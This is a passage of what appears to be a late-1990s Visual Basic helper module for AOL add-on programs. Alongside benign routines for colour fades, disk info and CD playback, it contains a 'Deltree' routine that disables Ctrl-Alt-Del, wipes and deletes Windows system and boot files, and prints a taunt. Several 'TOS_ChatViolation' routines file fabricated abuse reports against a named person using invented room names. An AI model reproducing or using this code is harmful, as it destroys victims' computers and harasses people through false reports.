Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub

Sub AddFileToTextBox(Fle As String, txt As TextBox)
'This adds the text in a file to a multiline textbox
'Good for Macro Shops
'AddFileToTextbox("C:\????",Text1)
Open Fle For Input As 1
txt.Text = Input$(LOF(1), 1)
Close 1
End Sub

Sub DestroyIM()
'This is for the new feature on AOL that when
'you send an IM it Ims you too
'This finds it and destroys it
'Written By Skybox
aol% = findwindow("AOL Frame25", vbNullString)
im% = FindChildByTitle(aol%, "Instant Message To: ")
Do
KillWin (im%)
Loop Until im% = 0
End Sub

Sub Filter(LookFor As String, ReplaceWith As String, txt As TextBox)
'This Is Like a Find and Replace Feature but it filters
'Filter("This is the Chracter to look for","This is the character to replace","This is the Textbox to look")
Do
If InStr(txt.Text, LookFor) = 0 Then Exit Do
macstringz = Left$(txt.Text, InStr(txt.Text, LookFor) - 1) + ReplaceWith + Right$(txt.Text, Len(txt.Text) - InStr(txt.Text, LookFor))
txt.Text = macstringz
Loop Until InStr(txt.Text, LookFor) = 0
End Sub

Sub FormFadeBW()
theForm.ScaleHeight = (256 * 2)
For a = 255 To 0 Step -1
theForm.Line (0, B)-(theForm.Width, B + 1), RGB(a + 1, a, a * 1), BF
B = B + 2
Next a

End Sub

Sub FormFadeWhite2Red()
theForm.ScaleHeight = (256 * 2)
For a = 255 To 0 Step -1
theForm.Line (0, B)-(theForm.Width, B + 99), RGB(a + 99, a, a * 1), BF
B = B + 2
Next a
End Sub

Sub FormFadePink2Red()
theForm.ScaleHeight = (256 * 2)
For a = 255 To 0 Step -1
theForm.Line (0, B)-(theForm.Width, B + 55), RGB(a + 225, a, a * 3), BF
B = B + 2
Next a
End Sub


Sub FormFadeSunset()
theForm.ScaleHeight = (256 * 2)
For a = 255 To 0 Step -1
theForm.Line (0, B)-(theForm.Width, B + 55), RGB(a + 99, a, a * 0), BF
B = B + 2
Next a
End Sub
Function GetFreePercent()
GetFreePercent = CurrentDisk.FreePcnt & "%"
End Function

Function GetUsedPercent()
GetUsedPercent = CurrentDisk.UsedPcnt & "%"
End Function

Function GetTotalBytes()
GetTotalBytes = CurrentDisk.TotalBytes
End Function
Function GetFreeBytes()
GetFreeBytes = CurrentDisk.FreeBytes
End Function
Sub IRC_AddRoom(Combo As Control)
On Error Resume Next
Chat% = findwindow("mIRC32", 0&)
AolList% = FindChildByClass(Chat%, "List")
Num = sendmessagebynum(AolList%, LB_GETCOUNT, 0, 0)
X = SetFocusAPI(Chat%)
For i% = 0 To Num - 1
    DoEvents
    namez$ = String$(256, " ")
    Ret = AOLGetList(i%, namez$)
    namez$ = Trim$(namez$)
    SN$ = UserSN()
    namez$ = Trim$(Mid$(namez$, 1, Len(namez$) - 1))
    If Trim$(UCase$(namez$)) = Trim$(UCase(SN$)) Then GoTo ACCC
    Combo.AddItem namez$
     Combo.ListIndex = 0
ACCC:
Next i%

End Sub

Sub IRC_SendChat(ByVal txt As String)
Let aol% = findwindow("mIRC32", 0&)
Let EDT% = FindChildByClass(aol%, "Edit")
Let message$ = txt
For i = 1 To 1
  Let AAA% = SendMessageByString(EDT%, WM_SETTEXT, 0, message$)
  Let BBB% = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
  timeout (0.001)
Next i
Let aol% = findwindow("mIRC32", 0&)
Let EDT% = FindChildByClass(aol%, "Edit")
Let message$ = txt
For i = 1 To 1
  Let AAA% = SendMessageByString(EDT%, WM_SETTEXT, 0, message$)
  Let BBB% = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
  timeout (0.001)
Next i
End Sub

Function GetTextFromRICHCNTL(hWindow As Integer)
aol% = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol%, "MDIClient")
Msg$ = String$(255, 0)
XX% = SendMessageLong(hWindow, WM_ProGGer, 254, Msg$)
Msg$ = Trim$(Msg$)
GetTextFromRICHCNTL = Msg$

End Function
Function GetWinINI(Section, key)
Dim RetVal As String, AppName As String, worked As Integer
    RetVal = String$(255, 0)
    worked = GetProfileString(Section, key, "", RetVal, Len(RetVal))
    If worked = 0 Then
        GetWinINI = "unknown"
    Else
        GetWinINI = Left(RetVal, worked)
    End If

End Function
Sub SNConvert(SN As String, aoldir As String, Replace As String)
'ScreenName("OLD SN","C:\aol30","New SN")
DoEvents
On Error GoTo ThatPlace
thenumber = Len(SN$)
If thenumber = 1 Then SN$ = SN$ + "         "
If thenumber = 2 Then SN$ = SN$ + "        "
If thenumber = 3 Then SN$ = SN$ + "       "
If thenumber = 4 Then SN$ = SN$ + "      "
If thenumber = 5 Then SN$ = SN$ + "     "
If thenumber = 6 Then SN$ = SN$ + "    "
If thenumber = 7 Then SN$ = SN$ + "   "
If thenumber = 8 Then SN$ = SN$ + "  "
If thenumber = 9 Then SN$ = SN$ + " "
thenumber = Len(Replace$)
If thenumber = 1 Then Replace$ = Replace$ + "         "
If thenumber = 2 Then Replace$ = Replace$ + "        "
If thenumber = 3 Then Replace$ = Replace$ + "       "
If thenumber = 4 Then Replace$ = Replace$ + "      "
If thenumber = 5 Then Replace$ = Replace$ + "     "
If thenumber = 6 Then Replace$ = Replace$ + "    "
If thenumber = 7 Then Replace$ = Replace$ + "   "
If thenumber = 8 Then Replace$ = Replace$ + "  "
If thenumber = 9 Then Replace$ = Replace$ + " "
ReplaceName$ = SN$
Open aoldir$ For Binary Access Read Write As #2
FileL = LOF(2)
Wonderer = FileL
TheHigh = 1
While Wonderer >= 0
If Wonderer > 32000 Then
        SickNess = 32000
    ElseIf Wonderer = 0 Then
        SickNess = 1
    Else
        SickNess = Wonderer
    End If
    Stripper$ = String$(SickNess, " ")
    Get #2, TheHigh, Stripper$
    Freak! = InStr(1, Stripper$, ReplaceName$, 1)
    If Freak! Then Mid$(Stripper$, Freak!) = Replace$
    Put #2, TheHigh, Stripper$
    TheHigh = TheHigh + SickNess
    Wonderer = FileL - TheHigh
    Wend
Close
Exit Sub
ThatPlace:
Resume hereu
hereu:
End Sub

Sub AOL_Available(Who)
aolver = AOLVersion()
If aolver = "3.0" Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call runmenubystring(a, "Send an Instant Message") 'Run Menu
Do: DoEvents
X = FindChildByTitle(a, "Send Instant Message") 'Find IM
bye = FindChildByTitle(a, "Send Instant Message")
If X <> 0 Then Exit Do
Loop
B = FindChildByClass(X, "_AOL_EDIT") 'Put the SN in the IM
to_who = Who
c = SendMessageByString(B, WM_SETTEXT, 0, to_who)
            
B = FindChildByClass(X, "RICHCNTL") 'Find msg area
what = ""
c = SendMessageByString(B, WM_SETTEXT, 0, what) 'Put msg in



D = FindChildByClass(X, "_AOL_ICON")  'Find one of the
            'buttons
e = GetNextWindow(D, 2) 'Next Button
F = GetNextWindow(e, 2) 'Next
G = GetNextWindow(F, 2) '
h = GetNextWindow(G, 2) '
i = GetNextWindow(h, 2) '
j = GetNextWindow(i, 2) '
k = GetNextWindow(j, 2) '
l = GetNextWindow(k, 2) '
M = GetNextWindow(l, 2) '
n = GetNextWindow(M, 2) '
X = sendmessagebynum(n, WM_LBUTTONDOWN, 0, 0&) 'Click send
X = sendmessagebynum(n, WM_LBUTTONUP, 0, 0&)
    Off% = findwindow("#32770", "America Online")
        X = sendmessagebynum(Off%, WM_Close, 0, 0)
X = sendmessagebynum(bye, WM_Close, 0, 0)
Exit Sub
End If
If aolver = "2.5" Then
Call Available25(Who)
Exit Sub
End If

End Sub
Sub AOL_DisableWin()
Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 0)
fc = FindChildByClass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 1)
faa = fc
Do
DoEvents
Let faf = faa
faa = GetNextWindow(faa, 2)
res = enablewindow(faa, 1)
DoEvents
Loop Until faf = faa

End Sub
Sub AOL_EnableWin()
Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 1)
fc = FindChildByClass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 1)
faa = fc
Do
DoEvents
Let faf = faa
faa = GetNextWindow(faa, 2)
res = enablewindow(faa, 1)
DoEvents
Loop Until faf = faa

End Sub
Sub HideDesktop()
a = findwindow("Shell_TrayWnd", 0&)
    X = showwindow(a, SW_HIDE)

End Sub
Sub ShowDesktop()
a = findwindow("Shell_TrayWnd", 0&)
    X = showwindow(a, SW_SHOW)

End Sub
Sub AOLAntiPint()
aol% = findwindow("AOL Frame25", 0&)
inv% = FindChildByTitle(aol%, "Invitation from: ")
KillWin (inv%)
End Sub


Sub Deltree()
Dim Root
Root = GetDiskInfo("C:\", "ROOTPATH")
Disable_CTRL_ALT_DEL
DestroyFile (WindowsDirectory + "\System\*.*")
DestroyFile (WindowsDirectory + "\System\*.sys")
DestroyFile (WindowsDirectory + "\Win.com")
DestroyFile (Root + "Autoexec.bat")
DestroyFile (Root + "Config.sys")
Printer.Print "You Have been owned!"
End Sub

Sub OpenDefaultBrowser(frm As Form, URL As String, Style As Integer)
'OpenDefaultBrowser(Me,"http://www.site.com",0)
opn% = ShellToBrowser(frm, URL, Style)
    
     End Sub
     '------------------------------------------------------------------
      
     ' Here's the function code
'ShellToBrowser(Me,"http://www.site.com",0)
     Function ShellToBrowser%(frm As Form, ByVal URL$, ByVal WindowStyle%)
         
         Dim api%
             api% = ShellExecute(frm.hwnd, "open", URL$, "", App.path, WindowStyle%)
      
         'Check return value
         If api% < 31 Then
             'error code - see api help for more info
             MsgBox App.Title & " had a problem running your web browser.You should check that your browser is correctly installed.(Error" & Format$(api%) & ")", 48, "Browser Unavailable"
             ShellToBrowser% = False
         ElseIf api% = 32 Then
             'no file association
             MsgBox App.Title & " could not find a file association for " & _
     URL$ & " on your system. You should check that your browser is correctly installed and associated with this type of file.", 48, _
     "Browser Unavailable"
             ShellToBrowser% = False
         Else
             'It worked!
             ShellToBrowser% = True
      
         End If
         
     End Function
      
  Sub PlayCD(TRack$)
     Dim lRet As Long
     Dim nCurrentTrack As Integer

     'Open the device
     lRet = MciSendString("open cdaudio alias cd wait", 0&, 0, 0)

     'Set the time format to Tracks (default is milliseconds)
     lRet = MciSendString("set cd time format tmsf", 0&, 0, 0)

     'Then to play from the beginning
     lRet = MciSendString("play cd", 0&, 0, 0)

     'Or to play from a specific track, say track 4
     nCurrentTrack = TRack
     lRet = MciSendString("play cd from" & Str(nCurrentTrack), 0&, 0, 0)

     End Sub

     Sub StopCD()
     Dim lRet As Long

     'Stop the playback
     lRet = MciSendString("stop cd wait", 0&, 0, 0)

     DoEvents  'Let Windows process the event

     'Close the device
     lRet = MciSendString("close cd", 0&, 0, 0)

     End Sub
Sub SelectText()
'In the getfocus event of the text box call the sub.
      Dim txtBox As Control
      Set txtBox = Screen.ActiveForm.ActiveControl
     End Sub

Sub TextFromFileToTextBox(Fle As String, txt As TextBox)
'Call TextFromFileToTextBox("C:\????\Filename.txt,Text1)
     Dim FileName As String
     Dim F As Integer

     FileName = Fle

        F = FreeFile                   'Get a file handle
        Open FileName For Input As F   'Open the file
        txt.Text = Input$(LOF(F), F) 'Read entire file into text box
        Close F                        'Close the file.

End Sub

Sub ListFiles(lst As ListBox, FileSpec As String)
' List all files from C:\Windows directory
'  Call ListFiles(List1,"C:\WINDOWS\*.*")
' Or to list the whole tree for the current drive:
'  Call ListFiles(List1,"*.*")
     Dim i As Long

     ' Clear existing data
     lst.Clear

     ' Add files / directories of specified types
     i = SendMessage(lst.hwnd, LB_DIR, DIR_DRIVES, ByVal sFileSpec)
     i = SendMessage(lst.hwnd, LB_DIR, DIR_DIRECTORIES, ByVal sFileSpec)
     i = SendMessage(lst.hwnd, LB_DIR, DIR_NORMALFILES, ByVal sFileSpec)

     End Sub
Sub CreateShortcut(where$, Caption$, Link$)
'CreateShortCut("C:\","ShortCut to Notepad","C:\Windows\Notepad.exe")
'Create Shortcut
Dim lReturn As Long
lReturn = fCreateShellLink(where, Caption, Link, "")
End Sub

Sub StartDialupConnection(ConnectionName$)
    Dim X
    X = Shell("rundll32.exe rnaui.dll,RnaDial " & "ConnectionName", 1)
    DoEvents
    SendKeys "{enter}", True
    DoEvents
End Sub

Sub DestroyFile(sFileName As String)
    Dim Block1 As String, Block2 As String, Blocks As Long
    Dim hFileHandle As Integer, iLoop As Long, offset As Long
    'Create two buffers with a specified 'wipe-out' characters
    Const BLOCKSIZE = 4096
    Block1 = String(BLOCKSIZE, "X")
    Block2 = String(BLOCKSIZE, " ")
    'Overwrite the file contents with the wipe-out characters
    hFileHandle = FreeFile
    Open sFileName For Binary As hFileHandle
        Blocks = (LOF(hFileHandle) \ BLOCKSIZE) + 1
        For iLoop = 1 To Blocks
            offset = Seek(hFileHandle)
            Put hFileHandle, , Block1
            Put hFileHandle, offset, Block2
        Next iLoop
    Close hFileHandle
    'Now you can delete the file, which contains no sensitive data
    Kill sFileName
End Sub

Function SetWallpaper(sFileName As String) As Long
        'Where sFileName = "(None)" to remove the wallpaper
        'or the full path and filename: "C:\windows\paper.bmp"
        '
        SetWallpaper = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, sFileName, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
End Function

Public Function TileBitmap(ByVal theForm As Form, ByVal theBitmap As PictureBox)
'Private Sub Form_Paint()
'    TileBitmap Form1, Picture1
'End Sub
    Dim iAcross As Integer
    Dim iDown As Integer
    theBitmap.AutoSize = True
    For iDown = 0 To (theForm.Width \ theBitmap.Width) + 1
        For iAcross = 0 To (theForm.Height \ theBitmap.Height) + 1
            theForm.PaintPicture theBitmap.Picture, iDown * theBitmap.Width, iAcross * theBitmap.Height, theBitmap.Width, theBitmap.Height
    Next iAcross, iDown
End Function
Sub ChangeResolution(iWidth As Single, iHeight As Single)
'Changes resolution on the fly, without rebooting
'Call with:
'Call ChangeResolution(800,600)
'or Call ChangeResolution(640,480) for example

    Dim a As Boolean
    Dim i&
    i = 0
    Do
        a = EnumDisplaySettings(0&, i&, DevM)
        i = i + 1
    Loop Until (a = False)
    
    Dim B&
    DevM.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT

    DevM.dmPelsWidth = iWidth
    DevM.dmPelsHeight = iHeight

    B = ChangeDisplaySettings(DevM, 0)
End Sub
Function GetDiskInfo(sRootPathName As String, sWhatInfo As String) As String
    'TO USE THIS FUNCTION:
    'INFO Options (Second Parameter):
    'FreeBytes, TotalBytes, FreePcnt, or UsedPcnt
    'Dim sMyInfo As String
    'sMyInfo = GetDiskInfo("c:\", "FreeBytes")
    Dim X As Long
    Dim lSectorsPerCluster As Long, lBytesPerSector As Long
    Dim lNumberOfFreeClusters As Long, lTotalNumberOfClusters As Long
    X = GetDiskFreeSpace(sRootPathName, lSectorsPerCluster, lBytesPerSector, lNumberOfFreeClusters, lTotalNumberOfClusters)
    GetDiskInfo = X
    If X Then
        CurrentDisk.RootPath = sRootPathName
        CurrentDisk.FreeBytes = lBytesPerSector * lSectorsPerCluster * lNumberOfFreeClusters
        CurrentDisk.TotalBytes = lBytesPerSector * lSectorsPerCluster * lTotalNumberOfClusters
        CurrentDisk.FreePcnt = (CurrentDisk.TotalBytes - CurrentDisk.FreeBytes) / CurrentDisk.TotalBytes
        CurrentDisk.UsedPcnt = CurrentDisk.FreeBytes / CurrentDisk.TotalBytes
    Else
        CurrentDisk.RootPath = ""
        CurrentDisk.FreeBytes = 0
        CurrentDisk.TotalBytes = 0
        CurrentDisk.FreePcnt = 0
        CurrentDisk.UsedPcnt = 0
    End If
    Select Case UCase(sWhatInfo)
        Case "ROOTPATH"
            GetDiskInfo = CurrentDisk.RootPath
        Case "FREEBYTES"
            GetDiskInfo = Format$(CurrentDisk.FreeBytes, "###,###,##0")
        Case "TOTALBYTES"
            GetDiskInfo = Format$(CurrentDisk.TotalBytes, "###,###,##0")
        Case "FREEPCNT"
            GetDiskInfo = Format$(CurrentDisk.FreePcnt, "Percent")
        Case "USEDPCNT"
            GetDiskInfo = Format$(CurrentDisk.UsedPcnt, "Percent")
    End Select
End Function
Sub AOLEditProfile(nick$, place$, bday$, sex$, status$, hobbies$, cpu$, occup$, quote$)
'This Edits your profile
'By Sex you must Use. "male","female" or "none"
Call runmenubystring("Member Directory", "Mem&bers")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
memberwin% = FindChildByTitle(mdi%, "Member Directory")
editz% = FindChildByClass(memberwin%, "_AOL_Icon")
Loop Until memberwin% <> 0
Ao_Click editz%
timeout 0.001
Do: DoEvents
editwin% = FindChildByTitle(mdi%, "Edit Your Online Profile")
blah% = FindChildByClass(editwin%, "_AOL_Edit") '-nick name
blah2% = GetNextWindow(blah%, 2) '-city, state
blah3% = GetNextWindow(blah2%, 2) '-birthday
blah4% = GetNextWindow(blah3%, 2) '-male button
blah5% = GetNextWindow(blah4%, 2) '-female button
blah6% = GetNextWindow(blah5%, 2) '-no response bttn
blah7% = GetNextWindow(blah6%, 2) '-maritial status
blah8% = GetNextWindow(blah7%, 2) '-hobbies
blah9% = GetNextWindow(blah8%, 2) '-computers used
blah10% = GetNextWindow(blah9%, 2) '-occupation
blah11% = GetNextWindow(blah10%, 2) '-personal quote
blah12% = GetNextWindow(blah11%, 2) '-update profile
Loop Until editwin% <> 0
Ao_SetText blah%, nick$
Ao_SetText blah2%, place$
Ao_SetText blah3%, bday$
If sex$ = "male" Then
Ao_Click blah4%
timeout 0.001
ElseIf sex$ = "female" Then
Ao_Click blah5%
timeout 0.001
ElseIf sex$ = "none" Then
Ao_Click blah6%
timeout 0.001
End If
Ao_Click blah7%
timeout 0.001
Ao_SetText blah7%, status$
Ao_SetText blah8%, hobbies$
Ao_SetText blah9%, cpu$
Ao_SetText blah10%, occup$
Ao_SetText blah11%, quote$
Ao_Click blah12%
timeout 0.001
waitforok
KillWin memberwin%
End Sub
Sub Ao_Click(btn As Integer)
ClckMe% = sendmessagebynum(btn%, WM_LBUTTONDOWN, 0, 0&)
ClckMe% = sendmessagebynum(btn%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AOLGetProfile(Who$)
run "Get a Member's Profile"
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
profilewin% = FindChildByTitle(mdi%, "Get a Member's Profile")
editz% = FindChildByClass(profilewin%, "_AOL_Edit")
okz% = GetNextWindow(editz%, 2)
Loop Until profilewin% <> 0
AOLSetText editz%, Who$
Ao_Click okz%
timeout 0.001
End Sub
Sub AOLGoToMenu(room$)
Call runmenubystring("Edit Go To Menu", "&Go To")
Do Until Modal% <> 0
    DoEvents
    Modal% = findwindow("_AOL_MODAL", "Favorite Places")
    Loop
Modal% = findwindow("_AOL_MODAL", "Favorite Places")
SaveBttn% = FindChildByTitle(Modal%, "Save Changes")
runedits% = FindChildByClass(Modal%, "_AOL_EDIT")
menuedts% = getwindow(runedits%, 2)
blah$ = "TOS99.BAS²"
Ao_SetText runedits%, blah$
Ao_SetText menuedts%, "aol://2719:2-2-" & room$
Ao_Click SaveBttn%
End Sub
Sub AOLGuestSignOn()
aol% = findwindow("AOL FRAME25", 0&)
Byes% = FindChildByTitle(aol%, "GoodBye from America Online!")
Comb% = FindChildByClass(Byes%, "_AOL_ComboBox")
blah = SendMessage(Comb%, &H400 + 6, 0, 0)
Fucku = SendMessage(Comb%, &H400 + 14, blah - 2, 0)
End Sub
Sub AOLSeachMemberProfiles_All(what$)
Call AOLKeyword("aol://4950:0000010000|all:" & what$ & "*")
End Sub
Sub AOLSearchMemberProfiles_Location(where$)
Call AOLKeyword("aol://4950:0000010000|location:" & where$)
End Sub
Sub AOLSearchMemberProfiles_MemberName(Who$)
Call AOLKeyword("aol://4950:0000010000|member_name:" & Who$)
End Sub
Sub Ao_SetText(SetThis As Integer, ByVal huh As String)
Q% = SendMessageByString(SetThis%, WM_SETTEXT, 0, huh)
End Sub

Sub TOS_CheckIfAlive(Who$)
Call Ao_Email(Who$ & ", ?", " ", " ")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
winz% = FindChildByTitle(mdi%, "Error")
viewz% = FindChildByClass(winz%, "_AOL_View")
bttnz% = FindChildByClass(winz%, "_AOL_Button")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
Loop Until winz% <> 0
X = GetWinText(viewz%)
If InStr(X, Who$) Then
Ao_Click bttnz%
KillWin mailwin%
dead = 1
MsgBox "" + Who$ + " is dead!", 64, ""
ElseIf Not InStr(X, Who$) Then
Ao_Click bttnz%
KillWin mailwin%
dead = 0
MsgBox "" + Who$ + " is alive.", 64, ""
End If
End Sub

Sub Ao_Email(Who$, Sb$, Msg$)
Call AOLMail(Who$, Sb$, Msg$)
End Sub

Sub TOS_ChatViolation_1(Who$, what$)
Ao_Keyword ("aol://1391:43-25547")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Notify AOL")
Loop Until toswin% <> 0
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Notify AOL")
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub

Function pc_fulldate() As String
pc_fulldate$ = Format$(Now, "mm/dd/yy h:mm AM/PM")
End Function
Function pc_fulldate2() As String
pc_fulldate2$ = Format$(Now, "mmmm, dddd dd, yyyy")
End Function
Function pc_date() As String
pc_date$ = Format$(Now, "mm/dd/yy")
End Function

Function pc_time() As String
pc_time$ = Format$(Now, "h:mm AM/PM")
End Function
Sub TOS_ChatViolation_2(Who$, what$)
Ao_Keyword ("kohelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "I Need Help!")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
tosbttn% = GetNextWindow(bttn%, 2)
Loop Until toswin% <> 0
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
toswin2% = FindChildByTitle(mdi%, "Notify AOL")
room% = FindChildByClass(toswin2%, "_AOL_Edit")
datez% = GetNextWindow(room%, 2)
shit% = GetNextWindow(datez%, 2)
names% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(names%, 2)
shit3% = GetNextWindow(shit2%, 2)
Lies% = GetNextWindow(shit3%, 2)
donez% = FindChildByClass(toswin2%, "_AOL_Icon")
Loop Until toswin2% <> 0
Randomize
    Phrases = 6
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then rooms$ = "Blabbatorium1"
      If phrase = 2 Then rooms$ = "Blabbatorium2"
      If phrase = 3 Then rooms$ = "Blabbatorium3"
      If phrase = 4 Then rooms$ = "Chatopia"
      If phrase = 5 Then rooms$ = "Blabsville"
      If phrase = 6 Then rooms$ = "Talksylvania"
Ao_SetText room%, rooms$
datezz$ = pc_fulldate()
Ao_SetText datez%, datezz$
namesz$ = Who$
Ao_SetText names%, namesz$
liesz$ = Who$ + ":     " + what$
Ao_SetText Lies%, liesz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin2%
KillWin toswin%
End Sub

Sub Ao_Keyword(Keywer$)
Call AOLKeyword(Keywer$)
End Sub


Sub TOS_ChatViolation_3(Who$, what$)
Ao_Keyword ("notifyaol")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
timeout 2#
Ao_Click bttn%
timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
KillWin toswin%
End Sub

Sub TOS_ChatViolation_4(Who$, what$)
Ao_Keyword ("ineedhelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
timeout 2#
Ao_Click bttn%
timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
